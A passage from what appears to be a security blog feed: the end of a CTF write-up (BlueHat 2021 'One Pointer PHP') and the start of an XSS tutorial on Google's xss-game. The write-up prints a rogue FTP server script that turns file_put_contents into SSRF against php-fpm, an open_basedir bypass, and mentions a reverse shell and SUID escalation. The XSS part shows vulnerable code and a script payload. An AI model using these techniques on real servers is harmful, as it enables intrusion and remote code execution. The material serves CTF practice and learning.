class="token comment">// print_r($params);</span><span class="token comment">//echo "Call: $uri\n\n";</span><span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>访问拿到payload</p><img src="/article/bluehat2021/image-20210503143546020.png" class="" title="fastpayload" loading="lazy"><h3 id="利用-ftp-与-php-fpm-对话-RCE"><a href="#利用-ftp-与-php-fpm-对话-RCE" class="headerlink" title="利用 ftp 与 php-fpm 对话 RCE"></a>利用 ftp 与 php-fpm 对话 RCE</h3><p>众所周知，如果可以将任意二进制数据包发送到 php-fpm 服务，则可以执行代码。 此技术通常与 <code>gopher://</code> 协议结合使用（ssrf），该协议受 curl 支持，<strong>但不受 php 支持</strong>。</p><p> <a href="https://www.php.net/manual/zh/wrappers.php#wrappers">php支持的协议和封装协议</a> 可代替发二进制包的协议只有<code>ftp://</code> ，况且 ftp 本身也是基于 tcp 的服务，能配合 php-fpm 进行 tcp 通信。</p><blockquote><p><strong>ftp 的两种传输模式</strong></p><p>ftp 有两种使用模式：主动模式（port）和被动模式（pasv）。</p><p>port 要求客户端和服务器端同时打开并且监听一个端口以创建连接。在这种情况下，客户端由于安装了防火墙会产生一些问题，连接有时候会被客户端的防火墙阻止。所以，创立了 pasv 。pasv 只要求服务器端产生一个监听相应端口的进程，这样就可以绕过客户端安装了防火墙的问题。</p><p>ftp 客户端和服务器之间需要建立两条 tcp 连接，一条是控制连接（ 21 端口），用来发送控制指令，另外一条是数据连接（ 20 端口 &#x2F; 随机端口），真正的文件传输是通过数据连接来完成的。</p><p><strong>两种传输模式的异同</strong></p><p>对于两种传输模式来说，控制连接的建立过程都是一样，均为服务器监听 21 号端口，客户端向服务器的该端口发起 tcp 连接。</p><p>两种传输模式的不同之处体现在数据连接的建立，对于数据连接的建立，主被动模式的不同在于数据连接的建立“服务器”是“主动”还是”被动”：</p><p>port 服务器通过控制连接知道客户端监听的端口后，使用自己的 20 号端口作为源端口，服务器“主动”发起 tcp 数据连接。</p><p>pasv 服务器监听 1024-65535 的一个随机端口，并通过控制连接将该端口告诉客户端，客户端向服务器的该端口发起 tcp 数据连接，这种情况下数据连接的建立相当于服务器是“被动”的。</p><img src="/article/bluehat2021/t012739ba782705dcdd.jpg" class="" title="ftp" loading="lazy"><p>如图，对于我们这题，显然只能用 pasv 模式，服务器监听的“随机端口”对应 php-fpm 监听的 9000 端口，详细过程我们通过一个实际的 pasv 例子来理解：</p><pre class="language-none"><code class="language-none">testbox1: &#123;&#x2F;home&#x2F;p-t&#x2F;slacker&#x2F;public_html&#125; % ftp -d testbox2Connected to testbox2.slacksite.com.220 testbox2.slacksite.com FTP server ready.Name (testbox2:slacker): slacker---&gt; USER slacker331 Password required for slacker.Password: TmpPass---&gt; PASS XXXX230 User slacker logged in.---&gt; SYST215 UNIX Type: L8Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; passivePassive mode on.ftp&gt; lsftp: setsockopt (ignored): Permission denied---&gt; PASV227 Entering Passive Mode (192,168,150,90,195,149).---&gt; LIST150 Opening ASCII mode data connection for file listdrwx------   3 slacker    users         104 Jul 27 01:45 public_html226 Transfer complete.ftp&gt; quit---&gt; QUIT221 Goodbye.</code></pre><p>以上是客户端 testbox1.slacksite.com (192.168.150.80) 发出 <code>PASV</code> 命令以指示其将等待服务器 testbox2.slacksite.com (192.168.150.90) “被动地”提供 ip 和端口号，然后客户端将创建到服务器的数据连接，其中：</p><pre class="language-none"><code class="language-none">227 Entering Passive Mode (192,168,150,90,195,149).</code></pre><p>这就是服务器“被动”返回的 ip 和端口号，分别是 32 位的主机地址和 16 位 tcp 端口地址，这个例子的就是 192.168.150.90 的 195*256 + 149 &#x3D; 50069 端口。</p><p>选择 ip 地址和端口号后，选择 ip 地址和端口的一方将开始侦听指定的地址&#x2F;端口，并等待另一方连接。 当对方连接到收听方后，数据传输开始。</p><p>我们这题需要将 ip 端口重定向为 127.0.0.1:9000 来试图 ssrf ，9000 % 256 &#x3D; 40 ，即可表达为：</p><pre class="language-none"><code class="language-none">227 Entering Passive Mode (127,0,0,1,35,40).</code></pre></blockquote><p><code>file_put_contents()</code> 用 <code>ftp://</code> 与我们的恶意服务器建立控制连接，使目标发送 <code>PASV</code> 命令，我们“被动”提供 ip 端口至本地 9001端口，然后建立起数据连接，将 data （fastcgi payload）的内容打到FastCGI服务</p><p>在<code>/var/www/html</code>目录写文件<code>file.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">'/tmp/file'</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">':)'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token operator">.</span><span class="token variable">$data</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// echo file_get_contents($file);</span></span></code></pre><p>准备利用前面生成的payload打</p><h3 id="起恶意ftp服务"><a href="#起恶意ftp服务" class="headerlink" title="起恶意ftp服务"></a>起恶意ftp服务</h3><p>用如下脚本，在公网vps起</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'220 welcome\n'</span><span class="token punctuation">)</span><span class="token comment">#Service ready for new user.</span><span class="token comment">#Client send anonymous username</span><span class="token comment">#USER anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'331 Please specify the password.\n'</span><span class="token punctuation">)</span><span class="token comment">#User name okay, need password.</span><span class="token comment">#Client send anonymous password.</span><span class="token comment">#PASS anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\n'</span><span class="token punctuation">)</span><span class="token comment">#User logged in, proceed. Logged out if appropriate.</span><span class="token comment">#TYPE I</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span><span class="token comment">#Size /</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'550 Could not get the file size.\n'</span><span class="token punctuation">)</span><span class="token comment">#EPSV (1)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 ok\n'</span><span class="token punctuation">)</span><span class="token comment">#PASV</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n'</span><span class="token punctuation">)</span> <span class="token comment">#STOR / (2) 注意打到9001端口的服务</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 Permission denied.\n'</span><span class="token punctuation">)</span><span class="token comment">#QUIT</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="干"><a href="#干" class="headerlink" title="干"></a>干</h3><p>干就完事了，访问<code>file.php</code>用payload打</p><p><code>./file.php?file=ftp://vps:9999/&amp;data=xxx</code></p><img src="/article/bluehat2021/image-20210503144504813.png" class="" title="gan" loading="lazy"><p>可以看到dump出来<code>int(681)</code>，这里就是打的数据包大小</p><p>这时已经突破open_basedir，可以任意访问目录了，同时也执行了恶意.so文件</p><img src="/article/bluehat2021/image-20210503144951807.png" class="" title="ls&#x2F;" loading="lazy"><p>下面就是suid提权了，那么大一个700 flag就在眼前</p><h3 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h3><p>既然可以执行恶意.so文件，那么直接弹个shell回来</p><img src="/article/bluehat2021/image-20210503145246770.png" class="" title="shell" loading="lazy"><p>在web shell上传自动化提权探测脚本，这里用的是<a href="https://github.com/rebootuser/LinEnum">LinEnum</a>，执行脚本，这里上传到哪都可以，毕竟已经突破了限制还弹了shell</p><pre class="language-none"><code class="language-none">&#x2F;var&#x2F;www&#x2F;html&#x2F;LinEnum.sh -s -r report -e &#x2F;tmp&#x2F; -t</code></pre><p>查看report</p><img src="/article/bluehat2021/image-20210503145518039.png" class="" title="report" loading="lazy"><p>没想到php就有s权限，直接运行即可</p><p>写文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>直接运行</p><img src="/article/bluehat2021/image-20210503145751850.png" class="" title="flag" loading="lazy"><p>GET IT</p><p>关于phpfpm与FastCGI模式的研究建议仔细看看部分参考文章，总的来说就是</p><p>FastCGI加载并调用hpdoger.so-&gt;bypass base_opendir-&gt;ftp-ssrf请求恶意ftp服务-&gt;本地php-fpm-&gt;rce</p><hr><p>参考文章：</p><p><a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">Ha1c9on</a></p><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">PHP绕过open_basedir列目录的研究</a></p><p><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob:&#x2F;&#x2F;</a></p><p><a href="https://xz.aliyun.com/t/5598">php-fpm的攻击方式</a></p><p><a href="https://www.cnblogs.com/leixiao-/p/10226633.html">PHP-FPM Fastcgi 未授权访问漏洞</a></p><p><a href="https://www.anquanke.com/post/id/186186#h3-3">Fastcgi绕过姿势</a></p><p><a href="https://www.anquanke.com/post/id/233454">利用ftp 与 php-fpm 对话 RCE</a></p><p><a href="https://buuoj.cn/challenges#[%E8%93%9D%E5%B8%BD%E6%9D%AF%202021]One%20Pointer%20PHP">复现平台buuoj</a></p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xss学习</title>
      <link href="article/xss/"/>
      <url>article/xss/</url>
      
        <content type="html"><![CDATA[<p>谷歌的小游戏，复习一下xss</p><span id="more"></span><p>项目地址：<a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><a href="https://xss-game.appspot.com/level1/frame">https://xss-game.appspot.com/level1/frame</a></p><pre class="language-python" data-language="python"><code class="language-python">page_header <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!doctype html>&lt;html>  &lt;head>    &lt;!-- Internal game scripts/styles, mostly boring stuff -->    &lt;script src="/static/game-frame.js">&lt;/script>    &lt;link rel="stylesheet" href="/static/game-frame-styles.css" />  &lt;/head>   &lt;body id="level1">    &lt;img src="/static/logos/level1.png">      &lt;div>"""</span> page_footer <span class="token operator">=</span> <span class="token triple-quoted-string string">"""    &lt;/div>  &lt;/body>&lt;/html>"""</span> main_page_markup <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;form action="" method="GET">  &lt;input id="query" name="query" value="Enter query here..."    onfocus="this.value=''">  &lt;input id="button" type="submit" value="Search">&lt;/form>"""</span> <span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_string</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># Show main search page</span>      self<span class="token punctuation">.</span>render_string<span class="token punctuation">(</span>page_header <span class="token operator">+</span> main_page_markup <span class="token operator">+</span> page_footer<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      query <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">,</span> <span class="token string">'[empty]'</span><span class="token punctuation">)</span>             <span class="token comment"># Our search engine broke, we found no results :-(</span>      message <span class="token operator">=</span> <span class="token string">"Sorry, no results were found for &lt;b>"</span> <span class="token operator">+</span> query <span class="token operator">+</span> <span class="token string">"&lt;/b>."</span>      message <span class="token operator">+=</span> <span class="token string">" &lt;a href='?'>Try again&lt;/a>."</span>       <span class="token comment"># Display the results page</span>      self<span class="token punctuation">.</span>render_string<span class="token punctuation">(</span>page_header <span class="token operator">+</span> message <span class="token operator">+</span> page_footer<span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>关键部分</p><pre class="language-python" data-language="python"><code class="language-python">query <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">,</span> <span class="token string">'[empty]'</span><span class="token punctuation">)</span>             <span class="token comment"># Our search engine broke, we found no results :-(</span>      message <span class="token operator">=</span> <span class="token string">"Sorry, no results were found for &lt;b>"</span> <span class="token operator">+</span> query <span class="token operator">+</span> <span class="token string">"&lt;/b>."</span>      message <span class="token operator">+=</span> <span class="token string">" &lt;a href='?'>Try again&lt;/a>."</span></code></pre><p><code>Sorry, no results were found for &lt;b&gt; + query + &lt;/b&gt;.</code></p><p>GET请求query会直接填入网页html</p><img src="/article/xss/image-20210424143837616.png" class="" title="level1-1" loading="lazy"><p>直接打即可，payload:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><img src="/article/xss/image-20210424143953579.png" class="" title="level1-2" loading="lazy"><hr><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><a href="https://xss-game.appspot.com/level2/frame">https://xss-game.appspot.com/level2/frame</a></p><p>源码·index.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token comment">&lt;!-- This is our database of messages --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/post-store.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">var</span> defaultMessage <span class="token operator">=</span> <span class="token string">"Welcome!&lt;br>&lt;br>This is your &lt;i>personal&lt;/i>"</span>        <span class="token operator">+</span> <span class="token string">" stream. You can post anything you want here, especially "</span>        <span class="token operator">+</span> <span class="token string">"&lt;span style='color: #f00ba7'>madness&lt;/span>."</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> <span class="token constant">DB</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PostDB</span><span class="token punctuation">(</span>defaultMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">function</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> containerEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"post-container"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>         <span class="token keyword">var</span> posts <span class="token operator">=</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">getPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>posts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">'&lt;table class="message"> &lt;tr> &lt;td valign=top> '</span>            <span class="token operator">+</span> <span class="token string">'&lt;img src="/static/level2_icon.png"> &lt;/td> &lt;td valign=top '</span>            <span class="token operator">+</span> <span class="token string">' class="message-container"> &lt;div class="shim">&lt;/div>'</span><span class="token punctuation">;</span>           html <span class="token operator">+=</span> <span class="token string">'&lt;b>You&lt;/b>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;span class="date">'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>date<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/span>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;blockquote>"</span> <span class="token operator">+</span> posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>message <span class="token operator">+</span> <span class="token string">"&lt;/blockquote"</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;/td>&lt;/tr>&lt;/table>"</span>          containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> html<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>       window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'clear-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> message <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>          <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>          document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level2.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Chatter from across the Web.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clear-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clear<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Clear all posts<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">valign</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/level2_icon.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token 